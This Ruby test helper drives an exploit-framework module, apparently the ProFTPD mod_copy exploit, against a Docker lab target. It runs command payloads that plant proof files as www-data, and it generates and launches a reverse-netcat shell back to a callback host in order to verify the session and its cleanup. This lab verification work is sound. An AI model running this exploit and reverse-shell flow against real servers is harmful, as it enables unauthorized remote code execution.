# frozen_string_literal: true

require 'English'
require 'net/http'
require 'shellwords'
require_relative '../rsync_creds/native'

# Native copy/PHP prerequisites gate original module commands and default sessions.
module ProftpdCopyTarget
  include RsyncCredentialTarget

  def rc_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'proftpd-owner.json'), JSON.pretty_generate(@rc)) if @rc
  end

  def rc_resource_roles
    ['target']
  end

  def pc_native(label, mode, *)
    output, = rc_command(label, 'target', 'python3', '-B', '/opt/module-target-proftpd/native_probe.py', mode, *)
    value = JSON.parse(output)
    @rc[:native] << { label: label, mode: mode, value: value }
    rc_save
    value
  end

  def pc_state(label)
    value = pc_native(label, 'state')
    @rc[:states] << { label: label, value: value }
    rc_save
    value
  end

  def pc_comparable(value)
    result = Marshal.load(Marshal.dump(value))
    result['processes'].each { |process| process.delete('state') }
    # Kernel TIME_WAIT records without a socket inode do not denote live owners.
    result['connections'].reject! { |row| row.values_at('state', 'inode') == %w[06 0] }
    result
  end

  def pc_preserved
    value = rc_poll do
      state = pc_state('preserved')
      state if pc_comparable(state) == pc_comparable(@baseline)
    end
    expect(pc_comparable(value)).to eq(pc_comparable(@baseline))
    expect(rc_json('framework.sessions.keys')).to eq([])
    expect(rc_json('framework.jobs.keys')).to eq([])
    expect(rc_json('ProftpdCopyObservation.sockets(framework)')).to all(include('closed' => true))
    rc_resources('preserved')
  end

  def pc_reset
    value = pc_state('before-explicit-reset')
    expected = value.slice('tmp', 'web')
    pc_native('explicit-reset', 'reset', Base64.strict_encode64(JSON.generate(expected)))
    # Record unclosed source sockets before the test's exact-socket backstop.
    @rc[:socket_cleanup] << rc_json('ProftpdCopyObservation.sockets(framework,cleanup:true)')
    rc_save
  end

  def pc_select
    console_command('back')
    console_command('use ' + ProftpdCopyObservation::OWNER)
    rc_json('{object:active_module.object_id,payload:active_module.datastore["PAYLOAD"],source:active_module.method(:exploit).source_location}')
  end

  def pc_options
    {
      'RHOSTS' => @ftp.fetch('host'), 'RPORT_FTP' => @ftp.fetch('port'), 'RPORT' => @http_port,
      'SSL' => false, 'TARGETURI' => '/lab/', 'TMPPATH' => '/tmp/copy',
      'SITEPATH' => '/var/www/html/lab', 'HttpClientTimeout' => 8, 'WfsDelay' => 2
    }
  end

  def pc_call(label, action, options = {})
    offset = rc_json('framework.instance_variable_get(:@proftpd_events).length')
    call = { label: label, action: action, options: pc_options.merge(options) }
    @rc[:calls] << call
    output = run_target_module(ProftpdCopyObservation::OWNER, 'target', call.fetch(:options), action: action, endpoint_options: {}, reuse_module: true, allow_errors: true, command_timeout: 65)
    call.merge!(output_base64: Base64.strict_encode64(output.b), events: rc_json("framework.instance_variable_get(:@proftpd_events).drop(#{offset})"), selection: rc_json('active_module.object_id'))
    rc_save
    call
  end

  def pc_native_command(label, command, path, content)
    expect(pc_native(label + '-absent', 'file', path)).to eq('exists' => false)
    arguments = @version == '1.3.5' ? [] : ['authenticated']
    value = pc_native(label, 'execute', Base64.strict_encode64(command.b), *arguments)
    expect(value).to include('native_passed' => true, 'copy_artifacts_removed' => true)
    expect(pc_native(label + '-proof', 'file', path)).to include('exists' => true, 'uid' => 33, 'base64' => Base64.strict_encode64(content.b))
  ensure
    pc_native(label + '-remove', 'remove', path)
  end

  def pc_command(label, content)
    selected = pc_select
    2.times do |iteration|
      path = "/tmp/copy/module-target-owner-#{label}-#{iteration}"
      command = 'printf %s ' + Shellwords.escape(content) + ' >> ' + path
      pc_native_command('native-' + label, command, path, content)
      console_command('set PAYLOAD cmd/unix/generic')
      rc_json("begin;active_module.datastore['CMD']=#{command.inspect};true;end")
      call = pc_call(label, 'run -z', 'PAYLOAD' => 'cmd/unix/generic', 'AllowNoCleanup' => true, 'DisablePayloadHandler' => true)
      expect(call.fetch(:selection)).to eq(selected.fetch('object'))
      expect(Base64.strict_decode64(call.fetch(:output_base64))).not_to include('Exploit failed', 'Exploit aborted')
      actual = rc_poll do
        value = pc_native('owner-command-proof', 'file', path)
        value if value.fetch('exists')
      end
      expect(actual).to include('uid' => 33, 'base64' => Base64.strict_encode64(content.b))
    ensure
      # Non-session payloads cannot perform FileDropper cleanup. Keep the raw
      # artifacts, then explicitly reset only the two disposable lab dirs.
      pc_reset
      pc_preserved
    end
  end

  def pc_callback_route
    output, = rc_command('callback-dns', 'target', 'getent', 'ahostsv4', 'host.docker.internal')
    @callback_host = output.split.first
    expect(@callback_host).to match(/\A\d+\.\d+\.\d+\.\d+\z/)
  end

  def pc_native_session(program, port)
    server = TCPServer.new('0.0.0.0', port)
    receiver = Thread.new do
      raise Timeout::Error, 'Native default payload did not connect' unless IO.select([server], nil, nil, 12)

      peer = server.accept
      begin
        peer.write("printf 'NATIVE_UID=';id -u;printf 'NATIVE_PID=%s\\n' \"$$\";exit\n")
        output = String.new
        Timeout.timeout(8) { output << peer.readpartial(1024) until output.match?(/NATIVE_PID=\d+\r?\n/) }
        output
      ensure
        peer.close
      end
    end
    receiver.report_on_exception = false
    executed = pc_native('native-default-payload', 'execute', Base64.strict_encode64("nohup #{program} &".b))
    output = Timeout.timeout(15) { receiver.value }
    expect(output).to match(/\ANATIVE_UID=33\r?\nNATIVE_PID=\d+\r?\n\z/)
    @rc[:controls] << { label: 'default-payload', payload: program, execution: executed, output_base64: Base64.strict_encode64(output.b) }
    rc_save
    pc_preserved
  ensure
    server&.close
    receiver&.kill if receiver&.alive?
    receiver&.join
  end

  def pc_session
    pc_callback_route
    # Console `use` restores the previous datastore. Clear that operator-set
    # payload before checking the actual cold default selected by `use`.
    console_command('unset PAYLOAD')
    selected = pc_select
    @rc[:cold_default] = selected
    expect(selected.fetch('payload')).to eq('cmd/unix/reverse_netcat')
    rc_json("begin;load 'test/module_targets/laravel/session_control.rb';true;end")
    2.times do |iteration|
      server = TCPServer.new('0.0.0.0', 0)
      port = server.local_address.ip_port
      server.close
      program = rc_json("begin;p=framework.payloads.create(#{selected.fetch('payload').inspect});p.datastore['LHOST']=#{@callback_host.inspect};p.datastore['LPORT']=#{port};p.generate;end")
      pc_native_session(program, port)
      call = pc_call('default-session-' + iteration.to_s, 'run -z', 'LHOST' => @callback_host, 'LPORT' => port, 'ReverseListenerBindAddress' => '0.0.0.0')
      expect(call.fetch(:selection)).to eq(selected.fetch('object'))
      row = rc_poll(25) { rc_json('framework.sessions.map{|id,s|{id:id,type:s.type,platform:s.platform}}').first }
      @session = row.fetch('id')
      path = "/tmp/module-target-proftpd-session-#{Process.pid}-#{iteration}"
      proof = rc_json("LaravelSessionControl.proof(framework,#{@session},#{path.inspect},'proftpd-proof',false,component:'proftpd')")
      @rc[:sessions] << { session: row, proof: proof, call: call }
      rc_save
      expect(row.fetch('type')).to eq('shell')
      expect(proof.fetch('identity')).to include('uid=33(www-data)')
      physical = pc_native('session-process', 'process', proof.fetch('pid').to_s)
      @rc[:sessions].last[:physical_process] = physical
      expect(physical).to include('uid' => 33, 'argv_base64' => Base64.strict_encode64("/bin/sh\0"))
      expect(physical.fetch('birth')).to match(/\A\d+\z/)
      output, = rc_command('session-physical-proof', 'target', 'stat', '-c', '%u:%s', path)
      expect(output.strip).to eq('33:13')
      output, = rc_command('session-exact-proof', 'target', 'cat', path)
      expect(output).to eq('proftpd-proof')
      pc_close_session
      rc_command('remove-session-proof', 'target', 'rm', '-f', '--', path)
      raw = pc_state('automatic-session-cleanup')
      # Physical module artifacts must be gone before any explicit lab reset.
      aggregate_failures('original execution and automatic artifact cleanup') do
        expect(Base64.strict_decode64(call.fetch(:output_base64))).not_to include('Exploit failed', 'Exploit aborted')
        expect(raw.values_at('tmp', 'web')).to eq(@baseline.values_at('tmp', 'web'))
      end
      pc_preserved
    ensure
      pc_close_session if @session
      rc_command('remove-session-proof', 'target', 'rm', '-f', '--', path) if path
      pc_reset
      pc_preserved
    end
  end

  def pc_close_session
    identifier = @session
    return unless identifier

    shutdown = rc_json("LaravelSessionControl.shutdown(framework,#{identifier},component:'proftpd')")
    @rc[:shutdowns] << shutdown
    rc_save
    proof = @rc.fetch(:sessions).last.fetch(:proof)
    # Netcat can retain its socket after the remote shell exits. Close the
    # Framework registration through its public API, then prove remote exit.
    console_command("sessions -k #{identifier}") if rc_json('framework.sessions.keys').include?(identifier)
    rc_poll do
      _, exit_code = rc_command('session-pid-closed', 'target', 'test', '!', '-e', '/proc/' + proof.fetch('pid').to_s, required: false)
      exit_code.zero?
    end
    rc_poll { !rc_json('framework.sessions.keys').include?(identifier) }
    @session = nil
  end
end
